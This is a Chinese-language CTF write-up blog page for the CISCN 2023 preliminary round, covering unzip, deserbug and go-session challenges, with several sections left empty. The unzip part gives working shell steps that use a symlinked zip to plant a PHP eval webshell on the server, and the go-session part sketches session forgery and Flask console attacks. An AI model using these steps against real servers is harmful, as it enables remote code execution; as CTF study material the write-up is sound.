@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="wc还有一个月就要国赛初赛了，大二让我进一次吧，冲！  unzipunzip 分析成功 随意上传，Server: nginx&#x2F;1.20.1，X-Powered-By: PHP&#x2F;8.1.9，不对，是apache  分析一下代码  1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo &#x3D; f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn23初赛">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="wc还有一个月就要国赛初赛了，大二让我进一次吧，冲！  unzipunzip 分析成功 随意上传，Server: nginx&#x2F;1.20.1，X-Powered-By: PHP&#x2F;8.1.9，不对，是apache  分析一下代码  1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo &#x3D; f">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-14T11:03:43.153Z">
+<meta property="article:modified_time" content="2024-11-15T06:03:49.568Z">
+<meta property="article:tag" content="recurrence">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ciscn23初赛</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/13/Java%E5%AE%89%E5%85%A85(1)_%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&text=ciscn23初赛"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&title=ciscn23初赛"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&is_video=false&description=ciscn23初赛"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ciscn23初赛&body=Check out this article: https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&title=ciscn23初赛"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&title=ciscn23初赛"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&title=ciscn23初赛"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&title=ciscn23初赛"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&name=ciscn23初赛&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&t=ciscn23初赛"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unzip"><span class="toc-number">1.</span> <span class="toc-text">unzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E5%88%86%E6%9E%90%E6%88%90%E5%8A%9F"><span class="toc-number">1.1.</span> <span class="toc-text">unzip 分析成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">unzip 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">zip手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">zip深入理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip-slip"><span class="toc-number">1.3.2.</span> <span class="toc-text">zip slip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.3.3.</span> <span class="toc-text">zip目录穿越</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deserbug"><span class="toc-number">2.</span> <span class="toc-text">deserbug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#deserbug-%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">deserbug 分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-session"><span class="toc-number">3.</span> <span class="toc-text">go-session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session-%E5%88%86%E6%9E%90%E5%A4%B1%E8%B4%A5"><span class="toc-number">3.1.</span> <span class="toc-text">go-session 分析失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.</span> <span class="toc-text">go-session总结</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ciscn23初赛
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-14T11:03:43.153Z" class="dt-published" itemprop="datePublished">2024-11-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/recurrence/" rel="tag">recurrence</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>wc还有一个月就要国赛初赛了，大二让我进一次吧，冲！</p>
+</blockquote>
+<h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><h3 id="unzip-分析成功"><a href="#unzip-分析成功" class="headerlink" title="unzip 分析成功"></a>unzip 分析成功</h3><ol>
+<li><p>随意上传，Server: nginx&#x2F;1.20.1，X-Powered-By: PHP&#x2F;8.1.9，不对，是apache</p>
+</li>
+<li><p>分析一下代码</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE); <span class="comment"># 常量返回 mime 类型。 自 PHP 5.3.0 可用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 以上判断是否为zip文件</span></span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this!    </span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找找切入点，我们可以进行操控的就是文件的内容，文件tmpname可以吗</p>
+<ol>
+<li>tmp_name用户原始上传文件名，可控？本机上不行，文件名是随机的bro在php中彻底断了想法</li>
+<li>unzip相关的漏洞</li>
+<li>tmp_name目录穿越 –&gt; 不可行，随机文件名</li>
+<li>unzip to rce？没找到，但是有新的文章<ol>
+<li><a target="_blank" rel="noopener" href="https://nandynarwhals.org/hxp-ctf-2021-unzipper/"></a>，但是这里有realpath() –&gt; 并特定注明<em><strong>Q1: 不能直接使用符号链接</strong></em>，这里没有realpath可以切入吗？这道题和国赛这题应用场景不一样的，有readfile()</li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2589?time__1311=n4+xni0=G=i=0QAeGNDQTcwnDB7f=DgeU7GoD"></a> –&gt; 有点意思，考虑使用软链接来搞，<strong>A1: 软链接应该是切入点</strong></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/kwame211/article/details/98059791"></a> –&gt; 会保留符号链接，但是问题在于<em><strong>Q2: 这里都是写入?</strong></em></li>
+</ol>
+</li>
+<li>或者unzip覆盖？ –&gt; 可以，-o表示覆盖已有文件并且不进行确认，unzip后文件名没有zip字</li>
+</ol>
+</li>
+<li><p>可以读取的话，这里也没得读取啊，软连接创建文件写入.&#x2F;kc1zs4.php？</p>
+<ol>
+<li><em><strong>Q3: 这里需要搭配目录穿越吧？</strong></em>: 刚好有文章<ol>
+<li>？<em><strong>Q4: zipslip</strong></em>，但是没有php的</li>
+<li><a target="_blank" rel="noopener" href="https://fiissh.tech/2021/android-fix-zip-path-traversal-vulnerability.html"></a> –&gt; 好像可以，为什么不试试？done，本地可以，应该通了</li>
+</ol>
+</li>
+<li>我们故意在<code>zip -y link.zip link</code>处忽略-y选项，可以做到直接创建文件，太棒了，上传木马文件</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html/kc1zs4.php link</span><br><span class="line">echo <span class="string">&quot;&lt;?php $_GET[&#x27;a&#x27;]?&gt;&quot;</span> &gt; link</span><br><span class="line"><span class="built_in">zip</span> link.<span class="built_in">zip</span> link</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果上传后没有反应，那肯定是我的问题，想想，本地可以生成啊？生成的问题？想一想生成过程，发现有可能kc1zs4.php是在ln生成符号链接后vim操作写入的，就是，这就是软连接的作用</p>
+<ol>
+<li>那生成文件的问题？感觉就是软连接这个地方 –&gt; <strong>生辰文件shell.php就是靠zip来解压啊</strong></li>
+<li>回想到在php的open_basedir绕过地方有一个绕过方法也是使用符号链接，参考那个解法进行叠加？但是怎么写入，先试试吗，硬想想不到</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标目录</span></span><br><span class="line">ln -s /var/www/html link</span><br><span class="line"><span class="built_in">zip</span> -y link.<span class="built_in">zip</span> link</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在可以访问到那一个目录，能访问到那不就好了啊</span></span><br><span class="line"><span class="comment"># *思路，将包含木马的文件在对应的文件夹解压就好，所以要解压出来带有目录</span></span><br><span class="line">mkdir link/</span><br><span class="line">cd ./link</span><br><span class="line">echo <span class="string">&quot;&lt;?php eval($_GET[&#x27;a&#x27;])?&gt;&quot;</span> &gt; kc1zs4.php</span><br><span class="line">cd ..</span><br><span class="line"><span class="built_in">zip</span> link.<span class="built_in">zip</span> link/* <span class="comment"># 使用link/*解压后会有link文件夹及下列的内容</span></span><br><span class="line"><span class="comment"># 获取的link.zip(zip文件名不重要，重要是包含link目录)文件就是我们的payload</span></span><br><span class="line"><span class="comment"># link文件夹是用来联合利用link链接的</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>试试吧，不行再来本地，通了，nice：还是要抓住本质</p>
+</li>
+</ol>
+<h3 id="unzip-总结"><a href="#unzip-总结" class="headerlink" title="unzip 总结"></a>unzip 总结</h3><blockquote>
+<p>虽然是web签到题，但是还是不容易啊，至少养成的思维是正确的</p>
+</blockquote>
+<ol>
+<li>也是自己找到入口点了</li>
+<li>始终要<em><strong>目标导向</strong></em>才能学好web啊，还是不能急，写入的目的是在目标目录写入文件，有解压？解压到目标目录？<em><strong>把已经确定的放在一起想想，比如这里软连接和目标目录</strong></em></li>
+<li>这里的Server并不是bp返回的nginx，而是访问其他目录后报错回来的apache –&gt; <em><strong>文件上传一般要确定服务器的类型</strong></em></li>
+<li><em><strong>没事就多试试，不要想不到就一直找资料</strong></em></li>
+<li><em><strong>确定点后想想性质</strong></em>，比如这里的符号链接可以直接使用这一点一开始没有想到</li>
+</ol>
+<h3 id="zip手法"><a href="#zip手法" class="headerlink" title="zip手法"></a>zip手法</h3><blockquote>
+<p>原题</p>
+</blockquote>
+<h4 id="zip深入理解"><a href="#zip深入理解" class="headerlink" title="zip深入理解"></a>zip深入理解</h4><h4 id="zip-slip"><a href="#zip-slip" class="headerlink" title="zip slip"></a>zip slip</h4><h4 id="zip目录穿越"><a href="#zip目录穿越" class="headerlink" title="zip目录穿越"></a>zip目录穿越</h4><h2 id="deserbug"><a href="#deserbug" class="headerlink" title="deserbug"></a>deserbug</h2><blockquote>
+<p>裂开了，java还没咋学啊，看来这个月得来攻击java了(还有期末考sad</p>
+</blockquote>
+<h3 id="deserbug-分析"><a href="#deserbug-分析" class="headerlink" title="deserbug 分析"></a>deserbug 分析</h3><h2 id="go-session"><a href="#go-session" class="headerlink" title="go-session"></a>go-session</h2><h3 id="go-session-分析失败"><a href="#go-session-分析失败" class="headerlink" title="go-session 分析失败"></a>go-session 分析失败</h3><ol>
+<li>分析一下代码<ol>
+<li>首先肯定是要session伪造，可知这里使用的seesion包是github.com&#x2F;gorilla&#x2F;sessions</li>
+<li>其次在&#x2F;flask下可以获取更多信息<ol>
+<li><code>https://7454328f-a7c8-4944-9a81-9addd540329d.challenge.ctf.show/flask?name</code>有东西，原来是<em><strong>Q1: 报错</strong></em>，sad，但是其中有一些代码，审计一下，要运行控制台进行交互的话需要pin</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>现在屡屡目标和方向吧<ol>
+<li>session伪造然后ssti</li>
+<li>flask pin访问&#x2F;flask控制台，为什么这里一直<strong>Q2: 没有反应</strong>，噢不对，<strong>A2: 这里的flask是重新发送了一个请求，艹了</strong></li>
+</ol>
+</li>
+<li>决定先从session入手<ol>
+<li>这里的环境变量用于验证，是否需要获取<em><strong>Q3: SESSION_KEY，可能是一个搜索关键词</strong></em></li>
+<li>发现session中的<code>Dv-BBAEC_4IAARABEAAAI_-CAAEGc3RyaW5nDAYABG5hbWUGc3RyaW5nDAcABWd1ZXN0</code>居然可以base64解码出来，应该就是根据SEESION_KEY获取的内容了</li>
+</ol>
+</li>
+<li>所以下一步应该是ssrf打到flask里面去，因为只有这一个入口点了，前面报错有flask的一部分源码，ssrf没有目标入口啊？？？</li>
+</ol>
+<h3 id="go-session总结"><a href="#go-session总结" class="headerlink" title="go-session总结"></a>go-session总结</h3><ol>
+<li><em><strong>对于可以直接生成的东西不要一直揪着不放，想清楚一点你要什么，比如这里的NewCookieStore()的签名算法</strong></em>，知道一个签名一个加密就ok，总之后续可以直接调用函数来生成</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unzip"><span class="toc-number">1.</span> <span class="toc-text">unzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E5%88%86%E6%9E%90%E6%88%90%E5%8A%9F"><span class="toc-number">1.1.</span> <span class="toc-text">unzip 分析成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">unzip 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">zip手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">zip深入理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip-slip"><span class="toc-number">1.3.2.</span> <span class="toc-text">zip slip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.3.3.</span> <span class="toc-text">zip目录穿越</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deserbug"><span class="toc-number">2.</span> <span class="toc-text">deserbug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#deserbug-%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">deserbug 分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-session"><span class="toc-number">3.</span> <span class="toc-text">go-session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session-%E5%88%86%E6%9E%90%E5%A4%B1%E8%B4%A5"><span class="toc-number">3.1.</span> <span class="toc-text">go-session 分析失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.</span> <span class="toc-text">go-session总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&text=ciscn23初赛"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&title=ciscn23初赛"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&is_video=false&description=ciscn23初赛"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ciscn23初赛&body=Check out this article: https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&title=ciscn23初赛"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&title=ciscn23初赛"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&title=ciscn23初赛"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&title=ciscn23初赛"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&name=ciscn23初赛&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/&t=ciscn23初赛"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
